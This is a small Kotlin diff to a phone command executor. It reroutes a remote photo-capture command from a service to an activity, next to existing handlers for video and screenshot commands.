@@ -49,7 +49,7 @@ class PhoneCommandExecutor : CommandExecutor {
             CommandProtocol.CMD_VIDEO_START -> { VideoService.start(ctx, front); status(ctx, "Video basladi") }
             CommandProtocol.CMD_VIDEO_STOP -> { VideoService.stop(ctx); status(ctx, "Video durdu") }
 
-            CommandProtocol.CMD_PHOTO -> PhotoService.capture(ctx, front)
+            CommandProtocol.CMD_PHOTO -> CaptureActivity.capture(ctx, front)
 
             CommandProtocol.CMD_SCREENSHOT ->
                 if (ScreenCaptureService.isActive) ScreenCaptureService.capture(ctx)
